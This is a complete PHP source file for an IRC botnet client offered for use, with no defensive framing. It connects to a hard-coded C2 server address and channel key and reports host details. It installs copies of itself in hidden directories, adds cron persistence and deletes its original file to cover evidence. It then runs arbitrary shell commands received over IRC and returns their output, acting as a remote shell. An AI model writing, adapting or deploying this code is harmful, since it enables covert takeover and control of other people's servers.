<?php
/**
 * IRC C2 Bot - Self-Installing Persistent Bot
 * Connects to IRC C2 server with authentication
 * Executes commands and self-installs with GSocket-style persistence
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ignore_user_abort(true);

// ============================================
// CONFIGURATION
// ============================================
define('IRC_SERVER', '152.89.170.207');
define('IRC_PORT', 6667);
define('IRC_CHANNEL', '#mg_master');
define('IRC_CHANNEL_KEY', '27311cb9f7be35a7e0e525cbdff06aab');
define('BOT_VERSION', '1.0');

// ============================================
// DUPLICATE PREVENTION
// ============================================
$lock_file = '/tmp/.irc_bot_' . md5($_SERVER['HTTP_HOST'] ?? gethostname()) . '.lock';

// Check if bot already running for this domain (only if posix_kill available)
if (file_exists($lock_file) && function_exists('posix_kill')) {
    $pid = @file_get_contents($lock_file);
    if ($pid && posix_kill((int)$pid, 0)) {
        // Bot already running, exit silently
        exit(0);
    }
}

// Create lock file with our PID
@file_put_contents($lock_file, getmypid());

// ============================================
// BOT IDENTITY
// ============================================
function getBotNick() {
    // Generate SHORT bot nickname (max 9 chars for ngircd)
    // Format: bot_XXXX (9 chars total)
    $domain = $_SERVER['HTTP_HOST'] ?? gethostname();
    $hash = substr(md5($domain), 0, 4);
    return 'bot_' . $hash;  // 4 + 4 = 8 chars (under 9 limit)
}

function getBotInfo() {
    return array(
        'domain' => $_SERVER['HTTP_HOST'] ?? 'unknown',
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
        'php_version' => phpversion(),
        'os' => PHP_OS,
        'user' => get_current_user(),
        'cwd' => getcwd(),
        'disabled_functions' => ini_get('disable_functions'),
    );
}

// ============================================
// SELF-INSTALLATION (GSOCKET-STYLE)
// ============================================
function installBot() {
    $myself = file_get_contents(__FILE__);
    $installed = false;
    
    // Installation paths (hidden like GSocket)
    $install_paths = array(
        getenv('HOME') . '/.config/irc/client.php',
        getenv('HOME') . '/.local/share/update/cache.php',
        '/var/www/.config/irc/bot.php',
        '/var/tmp/.system/update.php',
        '/usr/share/man/.irc/client.php',
    );
    
    // Install to multiple locations
    foreach ($install_paths as $path) {
        $dir = dirname($path);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        if (@file_put_contents($path, $myself)) {
            @chmod($path, 0644);
            $installed = $path;
            break;
        }
    }
    
    if (!$installed) {
        return false;
    }
    
    // Add cron persistence
    $cron_cmd = "*/10 * * * * php $installed > /dev/null 2>&1";
    $cron_reboot = "@reboot php $installed > /dev/null 2>&1";
    
    // Try to add to crontab
    @exec("(crontab -l 2>/dev/null | grep -v '$installed'; echo '$cron_cmd'; echo '$cron_reboot') | crontab - 2>/dev/null");
    
    // ALWAYS delete the original drop file after successful install
    // This prevents duplicate bots and cleanup evidence
    $original = __FILE__;
    if ($installed !== $original) {
        @unlink($original);
    }
    
    return $installed;
}

// ============================================
// COMMAND EXECUTION ENGINE (6 METHODS)
// ============================================
function executeCommand($cmd) {
    $output = '';
    $methods = array('proc_open', 'popen', 'shell_exec', 'exec', 'system', 'passthru');
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    
    foreach ($methods as $method) {
        if (in_array($method, $disabled) || !function_exists($method)) {
            continue;
        }
        
        switch ($method) {
            case 'proc_open':
                $descriptors = array(
                    0 => array('pipe', 'r'),
                    1 => array('pipe', 'w'),
                    2 => array('pipe', 'w')
                );
                $process = @proc_open($cmd . ' 2>&1', $descriptors, $pipes);
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    $output .= stream_get_contents($pipes[2]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    return $output ?: '[No output]';
                }
                break;
                
            case 'popen':
                $fp = @popen($cmd . ' 2>&1', 'r');
                if ($fp) {
                    while (!feof($fp)) {
                        $output .= fread($fp, 4096);
                    }
                    pclose($fp);
                    return $output ?: '[No output]';
                }
                break;
                
            case 'shell_exec':
                $output = @shell_exec($cmd . ' 2>&1');
                if ($output !== null) {
                    return $output ?: '[No output]';
                }
                break;
                
            case 'exec':
                $output_arr = array();
                @exec($cmd . ' 2>&1', $output_arr);
                if (!empty($output_arr)) {
                    return implode("\n", $output_arr);
                }
                break;
                
            case 'system':
                ob_start();
                @system($cmd . ' 2>&1');
                $output = ob_get_clean();
                if ($output) {
                    return $output;
                }
                break;
                
            case 'passthru':
                ob_start();
                @passthru($cmd . ' 2>&1');
                $output = ob_get_clean();
                if ($output) {
                    return $output;
                }
                break;
        }
    }
    
    return '[ERROR] All execution methods failed or disabled';
}

// ============================================
// IRC CONNECTION & MAIN LOOP
// ============================================
function ircBot() {
    global $lock_file;
    
    $bot_nick = getBotNick();
    $bot_info = getBotInfo();
    
    // Install bot first
    $installed_path = installBot();
    
    // Connect to IRC
    $socket = @fsockopen(IRC_SERVER, IRC_PORT, $errno, $errstr, 30);
    if (!$socket) {
        echo "✗ Connection failed: $errstr ($errno)\n";
        @unlink($lock_file);
        exit(1);
    }
    
    echo "✓ Connected to IRC server\n";
    
    // Set socket options
    stream_set_timeout($socket, 300);
    stream_set_blocking($socket, 0);
    
    // IRC handshake
    fputs($socket, "NICK $bot_nick\r\n");
    fputs($socket, "USER $bot_nick 0 * :IRC Bot\r\n");
    sleep(2);
    
    // Join channel with key
    fputs($socket, "JOIN " . IRC_CHANNEL . " " . IRC_CHANNEL_KEY . "\r\n");
    sleep(1);
    
    echo "✓ Joined channel: " . IRC_CHANNEL . "\n";
    echo "✓ Bot is now active and listening for commands\n";
    echo "✓ Installation: " . ($installed_path ? $installed_path : "pending") . "\n\n";
    flush();
    
    // Send bot info to channel
    $info_msg = "Bot connected: {$bot_info['domain']} | PHP {$bot_info['php_version']} | {$bot_info['os']} | User: {$bot_info['user']}";
    fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :$info_msg\r\n");
    
    // Main loop
    $last_ping = time();
    while (!feof($socket)) {
        $data = fgets($socket, 512);
        
        if (empty($data)) {
            usleep(100000); // 0.1 second
            
            // Send PING every 60 seconds
            if (time() - $last_ping > 60) {
                fputs($socket, "PING :keepalive\r\n");
                $last_ping = time();
            }
            continue;
        }
        
        // Handle PING
        if (preg_match('/^PING :(.*)$/i', $data, $matches)) {
            fputs($socket, "PONG :{$matches[1]}\r\n");
            continue;
        }
        
        // Debug: Log all PRIVMSG to see what we're receiving (optional, remove in production)
        if (stripos($data, 'PRIVMSG') !== false && stripos($data, IRC_CHANNEL) !== false) {
            $log = "/tmp/.irc_debug_" . md5($_SERVER['HTTP_HOST'] ?? gethostname()) . ".log";
            @file_put_contents($log, date('[Y-m-d H:i:s] ') . $data . "\n", FILE_APPEND);
        }
        
        // Handle commands in channel
        // Format: !cmd@bot_name command
        // Format: !cmd@all command
        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :!cmd@(\S+) (.+)$/i', $data, $matches)) {
            $target = $matches[1];
            $command = trim($matches[2]);
            
            // Check if command is for this bot or @all
            if ($target === $bot_nick || $target === 'all') {
                // Execute command
                $output = executeCommand($command);
                
                // NO TRUNCATION - send FULL output like true reverse shell
                // Split into lines and send each one
                $lines = explode("\n", $output);
                
                foreach ($lines as $line) {
                    $line = trim($line);
                    if (!empty($line)) {
                        // Only sanitize control chars, keep full line length
                        $line = str_replace(array("\r", "\t"), ' ', $line);
                        // IRC protocol max is ~512 bytes per message, keep it safe at 480
                        // If line is longer, chunk it
                        if (strlen($line) > 480) {
                            $chunks = str_split($line, 480);
                            foreach ($chunks as $chunk) {
                                fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $chunk\r\n");
                                usleep(200000); // 0.2s between chunks
                            }
                        } else {
                            fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $line\r\n");
                            usleep(200000); // 0.2s between lines
                        }
                    }
                }
                
                // If no output or empty
                if (empty($output) || $output === '[No output]') {
                    fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] ✓ Command executed (no output)\r\n");
                }
            }
        }
        
        // Handle !list command (match anywhere in message)
        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :.*!list/i', $data)) {
            $info_line = "[$bot_nick] Domain: {$bot_info['domain']} | IP: {$bot_info['server_ip']} | User: {$bot_info['user']}";
            fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :$info_line\r\n");
        }
        
        // Handle !help command
        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :.*!help/i', $data)) {
            fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] Commands: !list | !cmd@<nick> <command> | !cmd@all <command> | !info@<nick>\r\n");
        }
        
        // Handle !info command
        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :!info@' . preg_quote($bot_nick) . '$/i', $data)) {
            foreach ($bot_info as $key => $value) {
                fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] $key: $value\r\n");
                usleep(300000);
            }
        }
    }
    
    // Connection lost, cleanup
    fclose($socket);
    @unlink($lock_file);
    
    // If we're installed, re-execute from installed location
    if ($installed_path && file_exists($installed_path)) {
        sleep(30); // Wait 30 seconds before reconnecting
        @exec("php $installed_path > /dev/null 2>&1 &");
    }
}

// ============================================
// START BOT
// ============================================

// Daemonize if running from CLI (prevent death on CTRL+C)
if (php_sapi_name() === 'cli') {
    // Ignore user abort and SIGHUP
    ignore_user_abort(true);
    if (function_exists('pcntl_signal')) {
        pcntl_signal(SIGHUP, SIG_IGN);
    }
    
    // Try to fork into background (if pcntl available)
    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid === -1) {
            // Fork failed, continue in foreground
        } elseif ($pid) {
            // Parent process - exit and let child run
            echo "✓ Bot forked to background (PID: $pid)\n";
            exit(0);
        }
        // Child process continues...
        
        // Become session leader
        if (function_exists('posix_setsid')) {
            posix_setsid();
        }
    }
}

// Print success message immediately
echo "✓ IRC Bot Starting...\n";
echo "  Server: " . IRC_SERVER . ":" . IRC_PORT . "\n";
echo "  Channel: " . IRC_CHANNEL . "\n";
echo "  Nick: " . getBotNick() . "\n";
echo "  Installing and connecting...\n";
flush();

ircBot();

// If we get here, bot disconnected
echo "✗ Bot disconnected\n";
?>
